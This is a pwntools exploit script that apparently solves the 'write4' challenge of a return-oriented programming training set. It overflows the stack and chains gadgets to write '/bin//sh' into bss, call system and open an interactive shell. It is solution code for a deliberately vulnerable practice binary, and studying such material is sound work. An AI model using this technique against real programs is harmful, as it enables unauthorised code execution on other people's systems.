#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
exe = './write4'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main
break *pwnme
break *pwnme+79
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
elf = ELF('./write4')
rop = ROP(elf)

sh = bytearray(b'/bin//sh')
sh.reverse()
sh = sh.hex()


#Populate r14, r15 with values
#r14 - value of bss
#r15 - /bin/sh
g = rop.find_gadget(['pop r14', 'pop r15', 'ret'])
rop.raw(g.address)
rop.raw(elf.bss())
rop.raw(p64(int(sh,16))) #/bin//sh

#Move value of /bin/sh to bss
rop.raw(elf.sym.usefulGadgets)

#Populate rdi with pointer to /bin/sh
g = rop.find_gadget(['pop rdi', 'ret'])
rop.raw(g.address)
rop.raw(elf.bss())

#Execute system
rop.raw(elf.plt.system)

payload = fit({40:rop.chain()})

print(rop.dump())
print(hexdump(rop.chain()))

#payload = cyclic(300)
io.sendline(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

